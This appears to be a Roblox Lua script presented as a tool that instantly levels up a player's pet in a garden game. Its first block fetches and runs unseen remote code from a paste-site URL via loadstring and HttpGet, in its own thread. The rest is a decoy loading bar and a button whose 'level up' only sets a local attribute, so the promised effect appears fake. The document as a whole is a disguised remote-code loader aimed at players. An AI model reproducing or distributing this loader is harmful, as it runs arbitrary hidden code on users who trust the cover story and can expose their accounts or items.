-- Run Script 1 in its own thread
spawn(function()
    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/SFsqlUs1PR/0", true))()
end)

-- Run Script 2 (GUI + Garden GUI logic)
spawn(function()
    local player = game.Players.LocalPlayer
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")

    -- GUI setup (same as your original script)
    local petLoadingGui = Instance.new("ScreenGui")
    petLoadingGui.Name = "PetLoadingGui"
    petLoadingGui.ResetOnSpawn = false
    petLoadingGui.Parent = player:WaitForChild("PlayerGui")

    local petFrame = Instance.new("Frame")
    petFrame.Name = "MainFrame"
    petFrame.Size = UDim2.new(0, 220, 0, 70)
    petFrame.Position = UDim2.new(0.5, -110, 0.5, -35)
    petFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    petFrame.BackgroundColor3 = Color3.fromRGB(110, 180, 100)
    petFrame.Active = true
    petFrame.Draggable = true
    petFrame.Parent = petLoadingGui

    Instance.new("UICorner", petFrame).CornerRadius = UDim.new(0, 14)
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(60, 120, 60)
    stroke.Thickness = 2
    stroke.Parent = petFrame

    local pawPrint = Instance.new("TextLabel")
    pawPrint.Size = UDim2.new(0, 28, 0, 28)
    pawPrint.Position = UDim2.new(0, 10, 0, 10)
    pawPrint.BackgroundTransparency = 1
    pawPrint.Text = "üêæ"
    pawPrint.TextScaled = true
    pawPrint.Font = Enum.Font.GothamBlack
    pawPrint.TextColor3 = Color3.fromRGB(60, 120, 60)
    pawPrint.Parent = petFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -50, 0.4, 0)
    titleLabel.Position = UDim2.new(0, 48, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Pet Loading..."
    titleLabel.TextColor3 = Color3.fromRGB(40, 80, 40)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = petFrame

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0.7, 0, 0.3, 0)
    progressBg.Position = UDim2.new(0.15, 0, 0.55, 0)
    progressBg.BackgroundColor3 = Color3.fromRGB(170, 210, 170)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = petFrame
    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(0, 10)

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 10)

    local fillGlow = Instance.new("Frame")
    fillGlow.Size = UDim2.new(1, 0, 1, 0)
    fillGlow.BackgroundColor3 = Color3.fromRGB(120, 200, 120)
    fillGlow.BackgroundTransparency = 0.4
    fillGlow.BorderSizePixel = 0
    fillGlow.ZIndex = 2
    fillGlow.Parent = progressFill
    Instance.new("UICorner", fillGlow).CornerRadius = UDim.new(0, 10)

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(1, 0, 1, 0)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentLabel.TextStrokeTransparency = 0.5
    percentLabel.TextScaled = true
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.Parent = progressBg

    -- Garden GUI function
    local function showGardenGUI()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "GardenGui"
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.Parent = player:WaitForChild("PlayerGui")

        local mainFrame = Instance.new("Frame")
        mainFrame.Name = "MainFrame"
        mainFrame.Size = UDim2.new(0, 190, 0, 140)
        mainFrame.Position = UDim2.new(0.5, -95, 0.5, -70)
        mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        mainFrame.BackgroundColor3 = Color3.fromRGB(120, 180, 100)
        mainFrame.Active = true
        mainFrame.Draggable = true
        mainFrame.Parent = screenGui

        Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(80, 120, 80)
        stroke.Thickness = 2
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = mainFrame

        local gradient = Instance.new("UIGradient")
        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 170, 100)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 200, 120))
        }
        gradient.Rotation = 45
        gradient.Parent = mainFrame

        local creditLabel = Instance.new("TextLabel")
        creditLabel.Name = "CreditLabel"
        creditLabel.Size = UDim2.new(1, -20, 0, 18)
        creditLabel.Position = UDim2.new(0, 10, 0, 5)
        creditLabel.BackgroundTransparency = 1
        creditLabel.Text = "Made by Abgsweryoat"
        creditLabel.TextScaled = true
        creditLabel.Font = Enum.Font.Gotham
        creditLabel.TextColor3 = Color3.fromRGB(200, 255, 200)
        creditLabel.TextStrokeTransparency = 0.7
        creditLabel.TextWrapped = true
        creditLabel.Parent = mainFrame

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Name = "TitleLabel"
        titleLabel.Size = UDim2.new(1, -20, 0.4, 0)
        titleLabel.Position = UDim2.new(0, 10, 0, 25)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = "ü¶ù Tap to instantly lvl up your pet!"
        titleLabel.TextScaled = true
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        titleLabel.TextWrapped = true
        titleLabel.Parent = mainFrame

        local button = Instance.new("TextButton")
        button.Name = "GrowButton"
        button.Size = UDim2.new(0.8, 0, 0.25, 0)
        button.Position = UDim2.new(0.1, 0, 0.65, 0)
        button.BackgroundColor3 = Color3.fromRGB(90, 200, 90)
        button.Text = "Lvl up Now ü¶ñ"
        button.TextScaled = true
        button.Font = Enum.Font.Gotham
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Parent = mainFrame

        Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
        local buttonStroke = Instance.new("UIStroke")
        buttonStroke.Color = Color3.fromRGB(70, 160, 70)
        buttonStroke.Thickness = 1.5
        buttonStroke.Parent = button

        button.MouseButton1Click:Connect(function()
            print("üå± Grow button clicked")
            local garden = player:FindFirstChild("Garden")
            if garden then
                garden:SetAttribute("GrowthStage", 5)
                print("üåª Your garden is now fully grown!")
            else
                warn("üåµ Garden not found for this player.")
            end
        end)
    end

    -- Animate loading
    local function animateLoading()
        petFrame.BackgroundTransparency = 1
        for i = 1, 10 do
            petFrame.BackgroundTransparency -= 0.1
            wait(0.10)
        end

        for i = 1, 100 do
            percentLabel.Text = i .. "%"
            progressFill.Size = UDim2.new(i / 100, 0, 1, 0)
            wait(0.15)
        end

        wait(1)

        for i = 1, 10 do
            petFrame.BackgroundTransparency += 0.1
            wait(0.05)
        end

        petLoadingGui:Destroy()
        showGardenGUI()
    end

    animateLoading()
end)
